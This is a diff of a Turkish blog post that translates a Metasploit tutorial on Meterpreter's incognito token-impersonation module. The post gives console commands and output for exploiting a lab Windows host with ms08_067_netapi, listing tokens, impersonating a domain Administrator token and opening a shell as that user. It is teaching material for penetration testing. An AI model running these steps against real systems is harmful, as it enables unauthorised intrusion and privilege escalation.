@@ -5,7 +5,7 @@ date: 2017-05-25 09:03:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,25 +13,30 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework client exploit
-- msf client side exploit
-excerpt: Bu yazımızda, Metasplot Framework kullanarak İstemci tarafı exploit olarak
-  bir PDF dosyası oluşturmayı göreceğiz. Oluşturulan PDF, görünürde zararsız olsa
-  da içerisine zararlı kodlar gömülebilir.
+- Metasploit Framework incognito
+- msf meterpreter incognito modülü
+excerpt: Bir sisteme giriş yaptığınızda, sistemde bulunan kullanıcılara ait **token** adı verilen izin ve yetkilendirme kuralları bulunur. Bu kurallar, web uygulamalarında kullanılan **cookie** denilen çerez dosyalarına benzer. Kullanıcı ağdaki bir servise (örn. Net drive) ilk bağlandığında kullanıcı adı ve parolasıyla oturum açar. Oturum açıldığında sistem bu kullanıcıya bir **token** tanımlar.
 ---
 
-What is Incognito
+# Incognito Nedir?
 
-Incognito was originally a stand-alone application that allowed you to impersonate user tokens when successfully compromising a system. This was integrated into Metasploit and ultimately into Meterpreter. You can read more about Incognito and how token stealing works via Luke Jennings original paper.
+Bir sisteme giriş yaptığınızda, sistemde bulunan kullanıcılara ait **token** adı verilen izin ve yetkilendirme kuralları bulunur. Bu kurallar, web uygulamalarında kullanılan **cookie** denilen çerez dosyalarına benzer. Kullanıcı ağdaki bir servise (örn. Net drive) ilk bağlandığında kullanıcı adı ve parolasıyla oturum açar. Oturum açıldığında sistem bu kullanıcıya bir **token** tanımlar. Artık bilgisayar kapanana kadar tekrar tekrar parola girmeden, sistemde bulunan servisi kullanma imkanı olacaktır.
 
-In a nutshell, tokens are just like web cookies. They are a temporary key that allows you to access the system and network without having to provide credentials each time you access a file. Incognito exploits this the same way cookie stealing works, by replaying that temporary key when asked to authenticate. There are two types of tokens: delegate and impersonate. Delegate tokens are created for ‘interactive’ logons, such as logging into the machine or connecting to it via Remote Desktop. Impersonate tokens are for ‘non-interactive’ sessions, such as attaching a network drive or a domain logon script.
-The other great things about tokens? They persist until a reboot. When a user logs off, their delegate token is reported as an impersonate token, but will still hold all of the rights of a delegate token.
+Pentest işlemleri esnasında bu **token** ve yetkilerini ele geçirerek kullanmaya **incognito** işlemi denilmektedir. **token** izinleri, ikiye ayrılmaktadır. Bunlara __delegate__ ve __impersonate__ adı verilmektedir. Okuyucunun kafasının karışmaması için biz de İngilizce şekillerini kullanmaya devam edeceğiz. 
 
-TIP: File servers are virtual treasure troves of tokens since most file servers are used as network attached drives via domain logon scripts
-Once you have a Meterpreter session, you can impersonate valid tokens on the system and become that specific user without ever having to worry about credentials, or for that matter, even hashes. During a penetration test, this is especially useful due to the fact that tokens have the possibility of allowing local and/or domain privilege escalation, enabling you alternate avenues with potentially elevated privileges to multiple systems.
+Delegate: token izinleri beyan ediciler olarak kullanılır. Etkileşimli oturumlarda, örneğin uzak masaüstü bağlantıları tarzında işlemler için kullanılırlar.
 
-First, let’s load up our favorite exploit, ms08_067_netapi, with a Meterpreter payload. Note that we manually set the target because this particular exploit does not always auto-detect the target properly. Setting it to a known target will ensure the right memory addresses are used for exploitation.
+Impersonate: token izinleri kişisel olarak üretilmiş izinlerdir ve etkileşim olmayan servisler için kullanılırlar. Örneğin bir ağ klasörüne bağlanmak gibi.
 
+> Dosya sunucuları bu token izinleri için çok zengin bir bilgi kaynağıdırlar.
+
+Hedef sistemde bir token ele geçirdiğinizde, artık bir servise bağlanmak için o kullanıcının parolasını bilmeye gerek kalmaz çünkü yetkilendirme önceden yapılmıştır ve yetki kontrolü **token** iznine güvenilerek arka planda yapılır. Bir sistemde meterpreter shell açıldığında kullanılabilir durumda olan **token** listesi kontrol edilmelidir.
+
+## Meterpreter Oturum Açalım
+
+Aşağıdaki örnekte, öncelikle ```ms08_067_netapi``` modülü kullanılarak gerekli ayarlar yapılmakta ve bir oturum açılmaktadır.
+
+```sh
 msf > use exploit/windows/smb/ms08_067_netapi
 msf exploit(ms08_067_netapi) > set RHOST 10.211.55.140
 RHOST => 10.211.55.140
@@ -76,8 +81,13 @@ msf exploit(ms08_067_netapi) > exploit
 [*] Meterpreter session 1 opened (10.211.55.162:4444 -> 10.211.55.140:1028)
 
 meterpreter >
-We now have a Meterpreter console from which we will begin our incognito token attack. Like priv (hashdump and timestomp) and stdapi (upload, download, etc.), incognito is a Meterpreter module. We load the module into our Meterpreter session by executing the ‘use incognito‘ command. Issuing the help command shows us the variety of options we have for incognito and brief descriptions of each option.
+```
 
+## Incognito Modülünü Yükleyelim
+
+Meterpreter oturumu açmayı başardıktan sonra ```incognito``` modülünü kullanmamız gerekiyor. ```Incognito``` modülü, meterpreter e ait bir modül olduğundan ```use incognito``` komutuyla modülü aktif hale getiriyoruz. Ardından ```help``` komutunu verdiğinizde, ```incognito``` modülüne özel komutları görebiliriz.
+
+```sh
 meterpreter > use incognito
 Loading extension incognito...success.
 meterpreter > help
@@ -95,9 +105,13 @@ Incognito Commands
     snarf_hashes         Snarf challenge/response hashes for every token         
 
 meterpreter >
-What we will need to do first is identify if there are any valid tokens on this system. Depending on the level of access that your exploit provides, you are limited in the tokens you are able to view. When it comes to token stealing, SYSTEM is king. As SYSTEM you are allowed to see and use any token on the box.
+```
 
-TIP: Administrators don’t have access to all the tokens either, but they do have the ability to migrate to SYSTEM processes, effectively making them SYSTEM and able to see all the tokens available.
+## Sistemdeki token Listesi
+
+Meterpreter içerisinde ```incognito``` modülünü yükledikten sonra ```list_tokens``` komutuyla listeyi kontrol edelim. Listede bulunan bir takım **token** izinlerine Administrator kullanıcılarının bile erişimi olmayabilir. Bizim en fazla ilgileneceğimiz tür **SYSTEM** token izinleridir.
+
+```sh
 meterpreter > list_tokens -u
 
 Delegation Tokens Available
@@ -112,16 +126,25 @@ Impersonation Tokens Available
 NT AUTHORITY\ANONYMOUS LOGON
 
 meterpreter >
-We see here that there is a valid Administrator token that looks to be of interest. We now need to impersonate this token in order to assume its privileges. When issuing the impersonate_token command, note the two backslashes in “SNEAKS.IN\\ Administrator”. This is required as it causes bugs with just one slash. Note also that after successfully impersonating a token, we check our current userID by executing the getuid command.
+```
 
+Yukarıda listede bulunan ```SNEAKS.IN\Administrator``` isimli token fark ettiyseniz **Delegation** listesinde bulunmaktadır. Bunu **Impersonation** haline getirerek kişiselleştirmeniz gerekmektedir. Bunun için ```impersonate_token``` komutunu kullanacağız. Komutu girerken iki adet ```\\``` işareti kullanmaya dikkat edin. Listede ```\``` tek olsa da komutu girerken iki adet girilmelidir. 
+
+```sh
 meterpreter > impersonate_token SNEAKS.IN\\Administrator
 [+] Delegation token available
 [+] Successfully impersonated user SNEAKS.IN\Administrator
 meterpreter > getuid
 Server username: SNEAKS.IN\Administrator
 meterpreter >
-Next, let’s run a shell as this individual account by running ‘execute -f cmd.exe -i -t‘ from within Meterpreter. The ‘execute -f cmd.exe‘ is telling Metasploit to execute cmd.exe, the -i allows us to interact with the victims PC, and the -t assumes the role we just impersonated through incognito.
+```
+Komut başarıyla sonlandığında ```getuid``` komutuyla kullanıcı kimliğini kontrol ettiğimizde ```Server username: SNEAKS.IN\Administrator``` sonucu aldık. 
 
+## Yeni Kullacı ile Shell Açma
+
+Meterpreter içerisinde ```execute -f cmd.exe -i -t``` komutu ile komut satırında oturum açalım ve ```whoami``` komutuyla Windows kullanıcı kimliğine bakalım. Burada ```-i``` seçeneği **interact*** yani etkileşimli, ```-t``` seçeneği ise yeni ele geçirdiğimiz ```SNEAKS.IN\Administrator``` token iznini kullanmayı ifade eder. 
+
+```sh
 meterpreter > shell
 Process 2804 created.
 Channel 1 created.
@@ -133,3 +156,6 @@ whoami
 SNEAKS.IN\administrator
 
 C:\WINDOWS\system32>
+```
+
+Kişisel bilgisayarlarda karşılaşabileceğiniz **token** izinlerine, sunucu bilgisayarlarda daha çok rast gelebilirsiniz. Sunucularda bir çok servis etkileşimli ve çok kullanıcılı olarak çalıştığından liste daha uzun olacaktır. Bunların arasından en çok yetkili **token** izinleri denemelisiniz.
